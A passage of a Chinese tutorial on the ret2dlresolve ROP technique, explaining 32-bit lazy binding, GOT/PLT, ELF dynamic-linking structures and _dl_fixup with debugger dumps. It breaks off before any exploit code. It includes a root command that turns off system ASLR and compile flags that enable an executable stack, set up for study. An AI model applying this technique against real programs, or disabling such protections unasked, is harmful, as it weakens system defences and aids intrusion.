> 附件下载：
>
> 链接: [https://pan.baidu.com/s/1CAfnQC7oD-kcibxF5V52sQ](https://pan.baidu.com/s/1CAfnQC7oD-kcibxF5V52sQ) 提取码: 9a3w 
>
> --来自百度网盘超级会员v4的分享
>

# 前言
ret2dlresolve是高级ROP（Return-Oriented Programming：返回导向编程）的一种，顾名思义就是利用溢出或其他漏洞返回到“Linux动态链接库中符号解析过程”并加以利用；在解析符号真实地址的过程中有两个核心函数：_dl_runtime_resolve和其中的_dl_fixup。这种攻击方式较为麻烦和难以理解，可以作为解题时思路的最后选择（如PIE保护开启、简单的栈溢出无法泄露出更多的信息、无libc等）。

# ret2dlresolve-x86
## 延迟绑定（lazy binding）
延迟绑定技术是Linux动态链接是的核心，虽然动态链接相较于静态链接会牺牲一些性能，但是它相较于静态链接的文件具有有体积小，灵活性高的优势。

> 为了方便调试，在这篇文章中我们默认关闭ELF的PIE和系统的ALSR保护：
>
> root@ubuntu:/home/ubuntu# echo 0 > /proc/sys/kernel/randomize_va_space
>

## GOT和PLT
我们都知道，在动态链接中第一次调用某个函数时会通过GOT（Global Offset Table、全局偏移表）和PLT（Procedure <font style="color:#4D5156;">Linkage</font> Table、过程链接表）来寻找函数的真实地址，再次调用此函数时会直接跳转到该函数的真实地址去执行。下面使用一个简单32位的程序来演示这个过程：

```c
#include<stdio.h>
int main(){
	printf("cyberangel");
	return 0;
}
```

> 编译命令： gcc -g -m32 -z norelro -no-pie -z execstack -fstack-protector test.c -o test
>
> 如果编译报错：fatal error: bits/libc-header-start.h: No such file or directory
>
> 则执行sudo apt-get install gcc-multilib，执行之后再次执行编译命令即可
>

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1627464152991-21a417be-a6a9-4523-937e-6161c7d41ec9.png)

### PLT
当函数在call之后，会执行plt中的汇编指令：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1627712543667-3b296925-5aed-4224-8da0-6bc60393c241.png)

plt由两部分组成，我们所说的狭义plt表指的是.plt，这当中的jmp和push指令都具有特殊的含义，这里先不解释。

### GOT
同样的，got表被拆成了两个部分：.got和.got.plt；

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1627711298762-6886d078-e94c-42e5-b723-a2352a314c2d.png)

我们平常所说的和所用的got表一般是指.got.plt，它的前三项具有特殊含义，而从第四项开始存放着对外部函数引用的地址：![](https://cdn.nlark.com/yuque/0/2021/png/574026/1627712413016-fc275471-6a10-4e3b-aa85-8843ce264509.png)

> ".got"存放全局变量引用地址，".got.plt"存放函数引用地址
>

### 函数调用的基本过程
将如上程序进行编译，然后下断点对程序进行gdb调试（b 3）：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1627464207357-196ec171-4eff-4f81-898f-fc07a9b91fd8.png)

来到了call print，为了方便理解这里加入与IDA的对照：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1627464347208-8012d94a-ec97-4814-9737-b0e4dccc3f0e.png)

单步步入printf函数（si），现在程序已经来到plt的位置，gdb中显示的代码是跳转到0x80482cb：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1627464368634-0e3e9d9b-c0c5-4069-a226-00270a48181a.png)

IDA中我们双击_printf也看一下：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1627464384249-01cf5b84-bf0a-47f6-bcbe-cff6acda1e45.png)

下面要仔细观察程序的跳转流程，继续单步，发现此时jmp到0x80482C6处执行：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1627464833263-6bb5c43c-846d-455a-b4c2-e646e7cd6475.png)

---

此时你就应该有两个疑问了：诶？IDA明明显示的是jmp ds:off_8049730，但是奇怪的是此时的ds寄存器值为0x2b，那么现在不是应该jmp到ds*0x10+0x8049730==0x2b0+0x8049730==0x80499E0地址下存放的地址吗？

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1627531274919-552dee68-fa3c-483a-b2ea-b0d2b2a54a42.png)

为什么实际上jmp到的是0x8049730地址下的0x80482C6，也就是ds+0x8049730==0*0x10h+0x8049730==0x8049730？

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1627465739738-e64a9467-89a9-407d-8b63-8d53adef88ac.png)

首先上面的问题有一个致命的缺陷，地址0x80499E0处存放的是0x0，jmp 0是会跳转到非法的地址触发段错误，很明显是错的；

为了解释的更清楚，首先来看一个简单的汇编：

+ mov eax, dword ptr ds:[12345678]的含义是什么？

在我们学习汇编时可以知道ds属于段寄存器，全称是数据段寄存器；那么上面这条汇编指令的含义是将ds*0x10+0x123456这个地址中保存的数据赋值给eax寄存器（汇编指令中ptr是pointer指针的缩写），也就是把内存地址0x12345678中的双字型（32位）数据赋给eax。很明显这里我们将ds当作了0，实际上汇编代码的真正含义是ds.base*0x10+0x123456==0+0x123456==0x123456。要想理解ds.base的含义就要先简单的知道段寄存器的结构：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1627536732744-f8ed8d0d-0040-49a8-ac54-1d30fac4d345.png)

```c
struct SegMent {
    WORD Selector;   //可见：表示段选择符
    WORD Attributes; //不可见：该属性表示段寄存器的权限：可读、可写的还是可执行
    DWORD Base;      //不可见：表示段的基地址
    DWORD Limit;     //不可见：表示段的长度
}
```

在段寄存器中，只有Selector是可见的，在Linux系统下，各个Selector的值在Linux启动的过程中就已经被初始化，定义如下：

```c
//include/asm-i386/segment.h
#define __KERNEL_CS 0x10 ／＊内核代码段，index=2,TI=0,RPL=0＊／
#define __KERNEL_DS 0x18 ／＊内核数据段, index=3,TI=0,RPL=0＊／
#define __USER_CS 0x23 ／＊用户代码段, index=4,TI=0,RPL=3＊／
#define __USER_DS 0x2B ／＊用户数据段, index=5,TI=0,RPL=3＊／ //这也就是为什么在32位用户态下DS寄存器的值为0x2B
```

| 段寄存器 | Selector | Attribute | Base | Limit |
| --- | --- | --- | --- | --- |
| ES | 0x0023 | 可读、可写 | 0 | 0xFFFFFFFF |
| CS | 0x001B | 可读、可执行 | 0 | 0xFFFFFFFF |
| SS | 0x0023 | 可读、可写 | 0 | 0xFFFFFFFF |
| DS | 0x0023 | 可读、可写 | 0 | 0xFFFFFFFF |
| FS | 0x003B | 可读、可写 | 0x7FFDE000 | 0xFFF |
| GS | -- | -- | -- | -- |


所以在IDA中jmp ds:off_8049730计算出来的地址为：ds:off_8049730==ds.base:off_8049730==0*0x10+0x8049730==0x8049730：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1627538405901-c07bef5a-cf6b-4cc6-87bb-f7df042ac564.png)

其中，<0x8049730>表示[_GLOBAL_OFFSET_TABLE_+12]的所在地址为0x8049730：![](https://cdn.nlark.com/yuque/0/2021/png/574026/1627538707249-a9db870a-b976-4242-9e5e-a684c8507c5e.png)

由上可以得到：jmp dword ptr [_GLOBAL_OFFSET_TABLE_+12]的含义是跳转到0x8049730所存放的地址即0x080482c6处：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1627465739738-e64a9467-89a9-407d-8b63-8d53adef88ac.png)

> IDA的jmp ds:off_8049730为了方便理解可以看成jmp ptr ds:off_8049730
>

---

执行完2c6的push 0继续单步走，来到0x80482cb处：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1627539163857-bff710df-c0ec-4ffe-a03e-db1521115426.png)

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1627539239224-efcbff5a-3aeb-415b-ab94-866637ad01cd.png)

跳转后来到0x80482B0：

```c
.plt:080482B0
.plt:080482B0 sub_80482B0     proc near               ; CODE XREF: .plt:080482CB↓j
.plt:080482B0                                         ; .plt:080482DB↓j
.plt:080482B0 ; __unwind {
.plt:080482B0                 push    ds:dword_8049728  
.plt:080482B6                 jmp     ds:dword_804972C
.plt:080482B6 sub_80482B0     endp
.plt:080482B6
```

之前说过.got.plt前三项具有特殊的含义：

```c
.got.plt:08049724 _GLOBAL_OFFSET_TABLE_ dd offset _DYNAMIC  //保存着.dynamic节的起始地址，稍后我们再介绍它
.got.plt:08049728 dword_8049728   dd 0                    ; DATA XREF: sub_80482B0↑r  //保存着link_map的起始地址，之后会详细的说
.got.plt:0804972C dword_804972C   dd 0    					//保存的是_dl_runtime_resolve()函数的地址，之后会详细的了解
```

虽然在IDA的静态分析中地址0x08049728和0x0804972C都为0，但实际上这两个数据都会在程序加载的时候进行初始化，初始化之后的结果如下：

+ .got.plt:08049728 dword_8049728   dd f7ffd940h
+ .got.plt:0804972C dword_804972C   dd f7feadd0h

再次单步后就进入了由汇编指令组成的_dl_runtime_resolve，finish跳出_dl_runtime_resolve后printf的地址会被写入到.plt.got中，该函数return后会跳转到被解析的符号执行代码：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1627541305427-614f4ea7-69c9-4fb2-9dad-3dc949a1602f.png)

## ELF结构体
接下来看dl_runtime_resolve的具体实现，这部分涉及到ELF文件的结构体。_dl_runtime_resolve的汇编代码如下：

```c
//printf
pwndbg> disassemble 
Dump of assembler code for function _dl_runtime_resolve:
=> 0xf7feadd0 <+0>:	push   eax  //*eax==_DYNAMIC的起始地址
   0xf7feadd1 <+1>:	push   ecx  
   0xf7feadd2 <+2>:	push   edx
   0xf7feadd3 <+3>:	mov    edx,DWORD PTR [esp+0x10]  //esp+0x10中存放的是参数reloc_arg：0x0
   0xf7feadd7 <+7>:	mov    eax,DWORD PTR [esp+0xc]   //esp+0xc中存放的是link_map：0xf7ffd940
   0xf7feaddb <+11>:	call   0xf7fe4f10 <_dl_fixup>
   0xf7feade0 <+16>:	pop    edx
   0xf7feade1 <+17>:	mov    ecx,DWORD PTR [esp]
   0xf7feade4 <+20>:	mov    DWORD PTR [esp],eax
   0xf7feade7 <+23>:	mov    eax,DWORD PTR [esp+0x4]
   0xf7feadeb <+27>:	ret    0xc
End of assembler dump.
pwndbg> 
```

eax寄存器中存放的_DYNAMIC是动态链接过程很重要的一部分，我们需要额外的注意它：

### _DYNAMIC--Elf32_Dyn结构体
+ _GLOBAL_OFFSET_TABLE_所在的位置是0x8049724，在IDA中即可双击此地址后进入_DYNAMIC（重定位节区）：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1627545302247-06556148-a4ac-48df-b8af-3e89c0878c45.png)

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1627545899055-657379f9-32c3-4ecd-ae3b-b45ed8f634bd.png)

这里出现了Elf32_Dyn结构体，在源码中它的定义如下：

```c
//glibc-2.27/elf/elf.h 中：（约第806行--816行处）
/* Dynamic section entry.  */

typedef struct
{
  Elf32_Sword	d_tag;			/* Dynamic entry type */
  union
    {
      Elf32_Word d_val;			/* Integer value */		   //uint32_t大小为4字节
      Elf32_Addr d_ptr;			/* Address value */		   //uint32_t大小为4字节
    } d_un;
} Elf32_Dyn;  //每个Elf32_Dyn大小为8字节
```

d_tag是动态链接入口的类型，这些类型都定义在"./glibc-2.27/elf/elf.h"中，不同的类型具有不同的含义；以IDA的第二行（Elf32_Dyn <0Ch, <804828Ch>> ; DT_INIT；）为例，对应到Elf32_Dyn结构体中为：

+ Elf32_Sword d_tag==DT_INIT
+ Elf32_Word d_val==0Ch
+  Elf32_Addr d_ptr==804828Ch

每一个d_tag都对应着每一个节，比如0x804828Ch对应_init_proc（.init节），0x80481FCh对应着.dynstr节。

在后续伪造的过程中只需要计算这个结构体中的union共用体即可，无需计算d_tag

### .dynstr--DT_STRTAB--ELF_String_Table
双击地址0x80481FCh跳转后可以看到这个地址指向的是：ELF String Table（.dynstr节）

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1627550891097-80170501-33d5-4cf8-b0e9-ddfee33dca7c.png)

从上图可以看到ELF_String_Table包含动态链接所需的字符串(导入函数名、导入的库名等)，他们都是以\x00结尾，在内存中的形式如下：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1627552269771-42cafc45-bcef-4192-a9f3-596ea6995de3.png)

### .dynsym--DT_SYMTAB--ELF Symbol Table--Elf32_Sym结构体
_DYNAMIC中的0x80481ACh地址指向ELF Symbol Table

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1627554486355-f1609cdd-0091-4118-b5d0-1fa63d9b761c.png)

ELF Symbol Table中一个新类型的结构体--Elf32_Sym，这个结构体的定义如下：

```c
//glibc-2.27/elf/elf.h 中：（约第516行--526行处）
/* Symbol table entry.  */

typedef struct															   //每个Elf32_Sym大小为16字节
{
  Elf32_Word	st_name;		/* Symbol name (string tbl index) */       //uint32_t大小为4字节
  Elf32_Addr	st_value;		/* Symbol value */						   //uint32_t大小为4字节
  Elf32_Word	st_size;		/* Symbol size */                          //uint32_t大小为4字节
  unsigned char	st_info;		/* Symbol type and binding */              //unsigned char大小为1字节
  unsigned char	st_other;		/* Symbol visibility */					   //unsigned char大小为1字节
  Elf32_Section	st_shndx;		/* Section index */						   //uint16_t大小为2字节
} Elf32_Sym;
```

这里先从IDA看起：Elf32_Sym <offset aPrintf - offset byte_80481FC, 0, 0, 12h, 0, 0> ; "printf"

offset aPrintf - offset byte_80481FC计算出来的结果是0x08048216-0x80481FC==0x1A，所属结构体对应到内存中的形式为：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1627554273399-8fe06cd3-51b7-4d3e-b1bd-200eec62d9df.png)

> 一个0x00000000所占空间为4字节
>

另外，此结构体中的各个成员的含义如下（**各个成员的值为固定值（LOAD段），在动态链接过程及之后不会发生变化**）：

#### st_name
在上面的printf例子中，st_name的值为offset aPrintf - offset byte_80481FC==0x1A，该值代表着该符号的字符串名称相对于**ELF String Table起始地址**的偏移；若该值为0则表示此符号没有名称。

#### st_value
在该程序的_IO_stdin_used中，此处的值并没有和其他的符号一样为0，而是一个地址：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1627558786355-1fd1d610-0a71-4777-8c03-d39d29aad1fd.png)

可以双击进入来看一下：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1627558921961-585bf340-aa90-404f-9495-decbe73d3526.png)

所以st_value没有固定的类型，根据符号类型和用途，它可能是一个数值或地址，在编译的过程中依据上下文来确定。

#### st_size
同样，在符号_IO_stdin_used中该处的值不为0:

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1627559757937-2eccc46a-a36d-48df-bf8b-a6022edf2a40.png)

如果st_value处是一个数据对象如_IO_stdin_used，则表示数据对象占用的大小（此处为4）；如果符号没有大小或者大小未知，则此成员为0

#### st_info
该成员表示符号绑定信息，低4位表示符号类型（Symbol Type），高4位表示符号绑定信息（Symbol Binding）：

| 符号类型（Symbol Type）（低4位） | | |
| :---: | --- | --- |
| 宏定义名 | 值 | 说明 |
| STT_ NOTYPE | 0 | 未知类型符号 |
| STT_ OBJECT | 1 | 该符号是个数据对象，比如变量、数组等 |
| STT_ FUNC | 2 | 该符号是个函数或其他可执行代码 |
| STT_ SECTION | 3 | 符号与某个节区相关。这种类型的符号表项主要用于重定位，通常具有 STB_LOCAL 绑定。 |
| STT_ FILE | 4 | 该符号表示文件名，一般都是该目标文件所对应的源文件名，它一定是STB_LOCAL类型的，并且它的st_shndx一定是SHN_ABS符号类型 |


| 符号绑定信息（Symbol Binding）（高4位） | | |
| :---: | --- | --- |
| 宏定义名 | 值 | 说明 |
| STB_ LOCAL | 0 | 局部符号，对于目标文件的外部不可见 |
| STB_ GLOBAL | 1 | 全局符号，外部可见 |
| STB_ WEAK | 2 | 弱符号 |


对于导入符号而言，该值为0x12，可以在IDA中得到对应：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1627623546265-70b58677-ed9b-4327-8894-506f1f2b10a9.png)

#### st_other
未启用，该字节恒为0

#### st_shndx
在这篇文章中无需知道此成员的含义，在这里不做过多的说明。

### .rel.plt--DT_JMPREL--ELF JMPREL Relocation Table--Elf32_Rel
DT_JMPREL--0x804827Ch：这个地址指向ELF JMPREL Relocation Table

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1627551033988-e3748db0-86ff-43ce-a5c6-15db7975cbc6.png)

这里又牵扯到了一个结构体Elf32_Rel，其定义如下：

```c
//glibc-2.27/elf/elf.h 中：（约第631行）
/* Relocation table entry without addend (in section of type SHT_REL).  */

typedef struct
{
  Elf32_Addr	r_offset;		/* Address */                            //uint32_t大小为4字节
  Elf32_Word	r_info;			/* Relocation type and symbol index */   //uint32_t大小为4字节
} Elf32_Rel;
......
/* Relocation table entry with addend (in section of type SHT_RELA).  */

typedef struct
{
  Elf32_Addr	r_offset;		/* Address */
  Elf32_Word	r_info;			/* Relocation type and symbol index */
  Elf32_Sword	r_addend;		/* Addend */  //此成员给出一个常量补齐，用来计算将被填充到可重定位字段的数值。
} Elf32_Rela;
```

> 这里有两个结构体，在某些时候这两个结构体同时存在甚至是必须存在，主要由处理器体系结构来决定；可以理解为Elf32_Rela是对Elf32_Rel的补充
>

这里拿printf函数进行举例，在IDA中是这样的：Elf32_Rel <8049730h, 107h> ; R_386_JMP_SLOT printf；对应到结构体中为：

+ r_offset：对于可执行文件而言，其取值是需要重定位的虚拟地址，一般而言就是got表的地址：0x8049730h

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1627624438934-bdb6d99e-1449-466c-9353-86501f2cc246.png)

+ r_info：用于解析符号时的寻址过程，r_info >> 8后会得到一个索引（0x107 >> 8==0x1），对应此导入符号在ELF Symbol Table中的索引：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1627625213826-25c4e565-defb-4eb0-b9ef-b55b6351036f.png)

> 这里的索引和C语言数组的索引相同，都是从0开始的。
>

### segment and section
虽然在DT_STRTAB、DT_SYMTAB和DT_JMPREL都是属于LOAD段（segment），但是他们是属于不同的节（section），可以使用readelf来查看程序的所有节及其各个属性：

```powershell
ubuntu@ubuntu:~/Desktop/ret2dlresolve$ readelf -S ./test
There are 35 section headers, starting at offset 0x1690:

Section Headers:
  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al
  [ 0]                   NULL            00000000 000000 000000 00      0   0  0
  [ 1] .interp           PROGBITS        08048134 000134 000013 00   A  0   0  1
  [ 2] .note.ABI-tag     NOTE            08048148 000148 000020 00   A  0   0  4
  [ 3] .note.gnu.build-i NOTE            08048168 000168 000024 00   A  0   0  4
  [ 4] .gnu.hash         GNU_HASH        0804818c 00018c 000020 04   A  5   0  4
  [ 5] .dynsym           DYNSYM          080481ac 0001ac 000050 10   A  6   1  4 //DT_SYMTAB
  [ 6] .dynstr           STRTAB          080481fc 0001fc 00004c 00   A  0   0  1 //DT_STRTAB
  [ 7] .gnu.version      VERSYM          08048248 000248 00000a 02   A  5   0  2
  [ 8] .gnu.version_r    VERNEED         08048254 000254 000020 00   A  6   1  4
  [ 9] .rel.dyn          REL             08048274 000274 000008 08   A  5   0  4
  [10] .rel.plt          REL             0804827c 00027c 000010 08  AI  5  23  4 //DT_JMPREL
  [11] .init             PROGBITS        0804828c 00028c 000023 00  AX  0   0  4
  [12] .plt              PROGBITS        080482b0 0002b0 000030 04  AX  0   0 16
  [13] .plt.got          PROGBITS        080482e0 0002e0 000008 08  AX  0   0  8
  [14] .text             PROGBITS        080482f0 0002f0 0001c2 00  AX  0   0 16
  [15] .fini             PROGBITS        080484b4 0004b4 000014 00  AX  0   0  4
  [16] .rodata           PROGBITS        080484c8 0004c8 000013 00   A  0   0  4
  [17] .eh_frame_hdr     PROGBITS        080484dc 0004dc 000044 00   A  0   0  4
  [18] .eh_frame         PROGBITS        08048520 000520 000110 00   A  0   0  4
  [19] .init_array       INIT_ARRAY      08049630 000630 000004 04  WA  0   0  4
  [20] .fini_array       FINI_ARRAY      08049634 000634 000004 04  WA  0   0  4
  [21] .dynamic          DYNAMIC         08049638 000638 0000e8 08  WA  6   0  4
  [22] .got              PROGBITS        08049720 000720 000004 04  WA  0   0  4
  [23] .got.plt          PROGBITS        08049724 000724 000014 04  WA  0   0  4
  [24] .data             PROGBITS        08049738 000738 000008 00  WA  0   0  4
  [25] .bss              NOBITS          08049740 000740 000004 00  WA  0   0  1
  [26] .comment          PROGBITS        00000000 000740 000029 01  MS  0   0  1
  [27] .debug_aranges    PROGBITS        00000000 000769 000020 00      0   0  1
  [28] .debug_info       PROGBITS        00000000 000789 000326 00      0   0  1
  [29] .debug_abbrev     PROGBITS        00000000 000aaf 0000e0 00      0   0  1
  [30] .debug_line       PROGBITS        00000000 000b8f 0000be 00      0   0  1
  [31] .debug_str        PROGBITS        00000000 000c4d 0002a1 01  MS  0   0  1
  [32] .symtab           SYMTAB          00000000 000ef0 000460 10     33  49  4
  [33] .strtab           STRTAB          00000000 001350 0001f9 00      0   0  1
  [34] .shstrtab         STRTAB          00000000 001549 000145 00      0   0  1
Key to Flags:
  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),
  L (link order), O (extra OS processing required), G (group), T (TLS),
  C (compressed), x (unknown), o (OS specific), E (exclude),
  p (processor specific)
ubuntu@ubuntu:~/Desktop/ret2dlresolve$ 
```

## _dl_runtime_resolve
在执行_dl_runtime_resolve之前有这四条汇编语句值得我们注意：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1627626473490-af3f2432-b0a2-434c-83da-6307421c9249.png)

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1627626590884-dbf58fe7-3f9b-4f00-a12e-78caaded0f36.png)

因为有两个push并且可执行文件是32位的，所以可以将其中的两句push语句当作_dl_runtime_resolve的参数：_dl_runtime_resolve(link_map, reloc_arg)，其中reloc_arg==0，参数link_map也就是上图中地址0x8049728下存放的0xf7ffd940：

> &link_map==*(GOT+4)==*（_GLOBAL_OFFSET_TABLE_+4）==0xf7ffd940
>
> &_dl_runtime_resolve==*(GOT+8)==*（_GLOBAL_OFFSET_TABLE_+8）
>

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1627626752924-32658b86-dd20-4f7c-b9ed-da347d08f8ba.png)

link_map的本质是一个巨大的**<font style="color:#F5222D;">结构体链表</font>**，这个链表的作用是记录程序加载的所有共享库的信息，也就是说link_map包含链接器的标识信息等重要内容，当需要查找符号的真实地址时就遍历该链表找到对应的共享库；link_map在ELF文件载入内存时进行初始化：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1627627633945-7e8de44c-6c50-41b4-85e4-4ead5b889f7a.png)

同时所有的link_map是属于ld.so的：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1627738415574-29152d08-5946-467e-9716-4f0888d23de5.png)

上面的push的是该结构体链表中的第一个结点的地址，并且具有l_next和l_prev指针，所以可以追踪该link_map结构体链表中剩下的成员：

```c
pwndbg> p *l  								//第一个结构体：所在地址0xf7ffd940
$19 = {
  l_addr = 0, 
  l_name = 0xf7ffdc2c "", 
  l_ld = 0x8049638, 
  l_next = 0xf7ffdc30, 
  l_prev = 0x0, 
  l_real = 0xf7ffd940, 
  ......
pwndbg> p *l->l_next 						//第二个结构体：所在地址0xf7ffdc30
$21 = {
  l_addr = 4160573440,          //0xF7FD5000
  l_name = 0xf7ffdea0 "linux-gate.so.1", 
  l_ld = 0xf7fd531c, 
  l_next = 0xf7fd0110, 
  l_prev = 0xf7ffd940, 
  l_real = 0xf7ffdc30, 
  ......
pwndbg> p *l->l_next->l_next 
$22 = {										//第三个结构体：所在地址0xf7fd0110
  l_addr = 4158492672,          //0xF7DD9000
  l_name = 0xf7fd00f0 "/lib/i386-linux-gnu/libc.so.6", 
  l_ld = 0xf7fb0d8c, 
  l_next = 0xf7ffd558 <_rtld_global+1304>, 
  l_prev = 0xf7ffdc30, 
  l_real = 0xf7fd0110, 
pwndbg> p *l->l_next->l_next->l_next
$23 = {										//最后一个结构体：所在地址0xf7ffd558
  l_addr = 4160577536, 			//0xF7FD6000
  l_name = 0x8048134 "/lib/ld-linux.so.2", 
  l_ld = 0xf7ffcf34, 
  l_next = 0x0, 
  l_prev = 0xf7fd0110, 
  l_real = 0xf7ffd558 <_rtld_global+1304>, 

```

然后再来看另外一个参数reloc_arg，它的含义是该导入函数在.rel.plt（ELF JMPREL Relocation Table）中的偏移：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1627723138949-9eb82176-b6d3-45e9-b63a-fdd07d1293b5.png)

因为一个Elf32_Rel结构体的大小为8字节，所以符号printf的偏移为0、符号__libc_start_main的偏移为8：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1627628671983-7731ec02-db55-486f-99b7-d31a4f84a4ab.png)

```c
//printf
pwndbg> disassemble 
Dump of assembler code for function _dl_runtime_resolve:
=> 0xf7feadd0 <+0>:	push   eax  //*eax==_DYNAMIC的起始地址
   0xf7feadd1 <+1>:	push   ecx  
   0xf7feadd2 <+2>:	push   edx
   0xf7feadd3 <+3>:	mov    edx,DWORD PTR [esp+0x10]  //esp+0x10中存放的是参数reloc_arg：0x0
   0xf7feadd7 <+7>:	mov    eax,DWORD PTR [esp+0xc]   //esp+0xc中存放的是link_map：0xf7ffd940
   0xf7feaddb <+11>:	call   0xf7fe4f10 <_dl_fixup>
   0xf7feade0 <+16>:	pop    edx
   0xf7feade1 <+17>:	mov    ecx,DWORD PTR [esp]
   0xf7feade4 <+20>:	mov    DWORD PTR [esp],eax
   0xf7feade7 <+23>:	mov    eax,DWORD PTR [esp+0x4]
   0xf7feadeb <+27>:	ret    0xc
End of assembler dump.
pwndbg> 
```

## _dl_fixup执行流程
为了方便理解，这里选择引入glibc源码调试：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1627544037608-11fc7b1e-31a1-4bca-9aa5-8338237ced13.png)

_dl_fixup函数的定义如下：

```c
//glibc/elf/dl-runtime.c
DL_FIXUP_VALUE_TYPE
attribute_hidden __attribute ((noinline)) ARCH_FIXUP_ATTRIBUTE
_dl_fixup (
# ifdef ELF_MACHINE_RUNTIME_FIXUP_ARGS
	   ELF_MACHINE_RUNTIME_FIXUP_ARGS,
# endif
	   struct link_map *l, ElfW(Word) reloc_arg)
```

忽略掉宏定义的部分，实际上真正有用的是后两个参数：struct link_map *l, ElfW(Word) reloc_arg：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1627544963757-d687e9ff-fc81-4a8c-9623-c6233fcaedb1.png)

进入dl_fixup函数，先来看开头的一小部分代码：

```c
  const ElfW(Sym) *const symtab   
    = (const void *) D_PTR (l, l_info[DT_SYMTAB]);                   //获取symtab即.dynsym节的起始地址：0x80481ACh
  const char *strtab = (const void *) D_PTR (l, l_info[DT_STRTAB]);  //获取strtab即.dynstr节的起始地址：0x80481FCh
```

这里的D_PTR函数具有两个参数，一个是link_map的第一个结点地址，一个是link_map第一个结点中的l_info成员；link_map的作用之前说过，它是记录程序加载的所有共享库的信息，其中的l_info为一个指针数组，它记录了_DYNAMIC节中每一个Elf32_Dyn的所在地址（DT_SYMTAB等都是宏定义）：

```c
//glibc-2.27/include/link.h
	ElfW(Dyn) *l_info[DT_NUM + DT_THISPROCNUM + DT_VERSIONTAGNUM
		      + DT_EXTRANUM + DT_VALNUM + DT_ADDRNUM];
//在程序的内存中的值如下
pwndbg> p l->l_info 
$6 = {0x0, 0x8049638, 0x80496a8, 0x80496a0, 0x0, 0x8049678, 0x8049680, 0x0, 0x0, 0x0, 0x8049688, 0x8049690, 0x8049640, 0x8049648, 0x0, 0x0, 0x0, 0x80496c0, 0x80496c8, 0x80496d0, 0x80496b0, 0x8049698, 0x0, 0x80496b8, 0x0, 0x8049650, 0x8049660, 0x8049658, 0x8049668, 0x0, 0x0, 0x0, 0x0, 0x0, 0x80496e0, 0x80496d8, 0x0 <repeats 13 times>, 0x80496e8, 0x0 <repeats 25 times>, 0x8049670}
pwndbg>
//DT_SYMTAB、DT_STRTAB、DT_JMPREL、DT_VERSYM的宏定义都在glibc-2.27/elf/elf.h中：
#define DT_SYMTAB	6		/* Address of symbol table */
#define DT_STRTAB	5		/* Address of string table */
#define DT_PLTREL	20		/* Type of reloc in PLT */
#define DT_VERSYM	0x6ffffff0
//也就是说可以通过这些常量来确定程序某一section的地址
```

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1627705802555-8c479f29-58e4-4acc-9b05-291a1ab4cb04.png)

继续往下看：

```c
  const PLTREL *const reloc   
    = (const void *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset); //reloc==0x0804827C
	//这里搜寻DT_JMPREL的地址，然后与reloc_offset（即reloc_arg）相加，找到该符号在ELF JMPREL Relocation Table中对应的指针    

  const ElfW(Sym) *sym = &symtab[ELFW(R_SYM) (reloc->r_info)]; 
	//使用之前寻找到的symtab利用(reloc->r_info)>>8的结果当作下标以搜寻对应的符号在ELF Symbol Table中的地址：sym==0x80481bc
  const ElfW(Sym) *refsym = sym; //refsym== (const Elf32_Sym *) 0x80481bc

=======================================================================================
pwndbg> p/x *sym
$20 = {
  st_name = 0x1a, 
  st_value = 0x0, 
  st_size = 0x0, 
  st_info = 0x12, 
  st_other = 0x0, 
  st_shndx = 0x0
}
pwndbg> p/x sym
$21 = 0x80481bc
pwndbg> p/x &sym
$22 = 0xffffd2c4
pwndbg>
LOAD:080481AC ; ELF Symbol Table
LOAD:080481AC                 Elf32_Sym <0>
LOAD:080481BC                 Elf32_Sym <offset aPrintf - offset byte_80481FC, 0, 0, 12h, 0, 0> ; "printf"
LOAD:080481CC                 Elf32_Sym <offset aGmonStart - offset byte_80481FC, 0, 0, 20h, 0, 0> ; "__gmon_start__"
LOAD:080481DC                 Elf32_Sym <offset aLibcStartMain - offset byte_80481FC, 0, 0, 12h, 0, \ ; "__libc_start_main"
LOAD:080481DC                            0>
LOAD:080481EC                 Elf32_Sym <offset aIoStdinUsed - offset byte_80481FC, \ ; "_IO_stdin_used"
LOAD:080481EC                            offset _IO_stdin_used, 4, 11h, 0, 10h>
=======================================================================================
参数reloc_offset定义如下：
#ifndef reloc_offset
# define reloc_offset reloc_arg
# define reloc_index  reloc_arg / sizeof (PLTREL)
#endif
函数R_SYM的定义如下：
//glibc-2.27/elf/elf.h
#define ELF32_R_SYM(val)		((val) >> 8)
函数D_PTR的定义如下：
#ifdef DL_RO_DYN_SECTION
